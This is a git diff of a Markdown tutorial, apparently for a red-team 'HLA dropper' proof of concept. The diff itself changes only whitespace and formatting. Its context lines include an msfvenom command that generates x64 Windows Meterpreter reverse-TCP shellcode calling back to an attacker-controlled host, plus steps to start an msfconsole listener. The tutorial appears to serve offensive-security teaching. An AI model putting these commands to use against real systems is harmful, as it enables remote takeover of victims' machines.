@@ -166,6 +166,7 @@ int main() {
 ## Meterpreter Shellcode
 In this step, we will create our meterpreter shellcode for the HLA dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
 <details>
+    
 **kali>**       
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
@@ -184,6 +185,7 @@ The shellcode can then be copied into the HLA dropper poc by replacing the place
 ## MSF-Listener
 Before we test the functionality of our HLA-Dropper, we need to create a listener within msfconsole.
 <details>
+    
 **kali>**
 ```
 msfconsole
@@ -214,10 +216,9 @@ Once the listener has been successfully started, you can run your compiled high_
 
 ## HLA-Dropper analysis: dumpbin tool
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
-    
-**cmd>**
 <details>
     
+**cmd>**  
 ```
 cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
 dumpbin /imports high_level.exe
